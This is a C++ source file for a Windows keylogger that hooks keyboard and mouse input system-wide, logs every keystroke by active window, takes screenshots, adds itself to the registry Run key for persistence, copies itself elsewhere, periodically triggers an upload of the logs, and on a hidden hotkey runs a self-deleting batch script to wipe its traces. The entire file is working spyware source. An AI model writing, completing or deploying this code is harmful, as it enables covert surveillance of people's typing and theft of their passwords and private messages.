#include "keylogger.h"

using namespace std;

KeyLogger* KeyLogger::instance = NULL;

void KeyLogger::persist() {
	
	HKEY key;

	RegCreateKey(
		HKEY_CURRENT_USER,
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		&key
	);

	std::string keyValue = "\"";

	keyValue += programPath;

	keyValue += "\"";

	RegSetValueEx(key, REGKEY_NAME, 0, REG_SZ, (BYTE*)keyValue.c_str(), keyValue.length());
	
	lastUpload = time(NULL);
}

void KeyLogger::purge() {
	
	HKEY key;
	RegCreateKey(
		HKEY_CURRENT_USER,
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		&key
		);
	RegDeleteValue(key, REGKEY_NAME);

	logFile.close();
	UnhookWindowsHookEx(khook);
	UnhookWindowsHookEx(mhook);

	ofstream batchFile;
	batchFile.open(BATCH_NAME);
	batchFile << "@echo off" << endl;
	batchFile << ":Repeat" << endl;
	batchFile << "del " << programPath << endl;
	batchFile << "rmdir /s /q " << programDir << DATADIR << endl;
	batchFile << "if exist " << programPath << " goto Repeat" << endl;
	batchFile << "del " << BATCH_NAME << endl;
	batchFile.close();
	system("start cleaner.bat");

	exit(0);
}

std::string KeyLogger::removeFilespec(std::string path) {
	while (path[path.length() - 1] != '\\') {
		path.erase(path.length() - 1);
	}

	return path;
}

KeyLogger::KeyLogger() {

	//FreeConsole();
    //ShowWindow(GetConsoleWindow(), SW_HIDE);

    lshiftDown = false;
    rshiftDown = false;
    altDown = false;
    ctrlDown = false;

	char buffer[1024];
	GetModuleFileName(NULL, buffer, sizeof(buffer));
	
	programPath = buffer;
	programDir = removeFilespec(programPath);

	CreateDirectory(std::string(programDir + DATADIR).c_str(), NULL);
	
	activeWindowTitle = getActiveWindowTitle();
}

KeyLogger::~KeyLogger() {
    logFile.close();
	UnhookWindowsHookEx(khook);
	UnhookWindowsHookEx(mhook);
}

KeyLogger* KeyLogger::getInstance() {

    if(instance == NULL) {
        instance = new KeyLogger();
	 }

    return instance;
}

void KeyLogger::releaseInstance() {

    if(instance != NULL) {
        delete instance;
        instance = NULL;
    }
}

LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {

	KeyLogger* keylogger = getInstance();

    if (nCode >= 0) {

		//key pressed
        if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

            KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);

			if (hooked.scanCode == HOTKEY_PURGE) {
				keylogger->purge();
			}

            switch(hooked.scanCode) {

                case SC_LSHIFT:
					if (!keylogger->isLShiftDown()) {
						keylogger->setLShiftDown(true);
						keylogger->log("<LSHIFT>");
					}
                    break;
                case SC_RSHIFT:
					if (!keylogger->isRShiftDown()) {
						keylogger->setRShiftDown(true);
						keylogger->log("<RSHIFT>");
					}
                    break;
                case SC_ALT:
					if (!keylogger->isAltDown()) {
						keylogger->setAltDown(true);
						keylogger->log("<ALT>");
					}
                    break;
                case SC_CTRL:
					if (!keylogger->isCtrlDown()) {
						keylogger->setCtrlDown(true);
						keylogger->log("<CTRL>");
					}
                    break;
				case SC_SPACE:
					keylogger->log(" ");
					break;
				case SC_ENTER:
					keylogger->log("<ENTER>\n");
					break;
				case SC_TAB:
					keylogger->log("<TAB>");
					break;
				case SC_BACKSPACE:
					keylogger->log("<BACKSPACE>");
					break;
				case SC_CAPSLOCK:
					keylogger->log("<CAPSLOCK>");
					break;
				case SC_ESCAPE:
					keylogger->log("<ESCAPE>");
					break;
                default:
                    DWORD key = 1;
                    key += hooked.scanCode << 16;
                    key += hooked.flags << 24;
					char keyText[100];
					GetKeyNameText(key, keyText, sizeof(keyText));
					keylogger->log(keyText);
            }
        }

		//key released
        if(wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {

            KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);

            switch(hooked.scanCode) {

                case SC_LSHIFT:
					keylogger->setLShiftDown(false);
					keylogger->log("</LSHIFT>");
                    break;
                case SC_RSHIFT:
					keylogger->setRShiftDown(false);
					keylogger->log("</RSHIFT>");
                    break;
                case SC_ALT:
					keylogger->setAltDown(false);
					keylogger->log("</ALT>");
                    break;
                case SC_CTRL:
					keylogger->setCtrlDown(false);
					keylogger->log("</CTRL>");
                    break;
                default:
                    break;
            }
        }

		//mouse clicked
		if (wParam == WM_LBUTTONDOWN) {

			MSLLHOOKSTRUCT hooked = *((MSLLHOOKSTRUCT*)lParam);
			std::stringstream logStr;
			logStr << "<LMOUSE (" << hooked.pt.x << ", " << hooked.pt.y << ") >\n";
			keylogger->log(logStr.str());
		}

    }

	return CallNextHookEx(keylogger->khook, nCode, wParam, lParam);
}

std::string KeyLogger::screenshot() {
	std::stringstream fileName;
	fileName << programDir << DATADIR << "\\" <<  time(NULL) << ".bmp";
	takeScreenshot(GetDesktopWindow(), fileName.str());

	log("<SCREENSHOT " + fileName.str() + ">\n");

	return fileName.str();
}

void KeyLogger::loop() {
	MSG message;
	while (GetMessage(&message, NULL, 0, 0)) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

void KeyLogger::listen() {

	HINSTANCE instance = GetModuleHandle(NULL);
	if (!instance) {
		exit(1);
	}
	
	//setup keyboard and mouse hooks
	khook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookFunction, instance, 0);
	mhook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)hookFunction, instance, 0);

	logFile.open(programDir + DATADIR + "\\" + KEYSTROKES_FILE, ios::app);
	
}

void KeyLogger::log(std::string text) {
	
	//user switched windows
	if (getActiveWindowTitle() != activeWindowTitle) {
		writeBuffer();//dump last window's information to file
	}

	keyboardBuffer += text;
}

void KeyLogger::copySelf(std::string target) {

	CopyFile(programPath.c_str(), target.c_str(), false);
	programPath = target;
	persist();
}

void KeyLogger::writeBuffer()
{
	logFile << getTimeString() << endl << activeWindowTitle << endl << "===============================" << endl << keyboardBuffer << endl << "===============================" << endl << endl;

	if (time(NULL) - lastUpload > UPLOAD_DELTA) {
		lastUpload = time(NULL);
		upload();
	}

	activeWindowTitle = getActiveWindowTitle();
	keyboardBuffer = "";
}

std::string KeyLogger::getTimeString() {
	
	time_t currentTime = time(NULL);
	char dateString[100];
	ctime_s(dateString, sizeof(dateString), &currentTime);
	dateString[strlen(dateString) - 1] = NULL;

	return std::string(dateString);
}

std::string KeyLogger::getActiveWindowTitle() {

    char title[256];
    HWND hwnd = GetForegroundWindow();
    GetWindowText(hwnd, title, sizeof(title));
    return std::string(title);
}

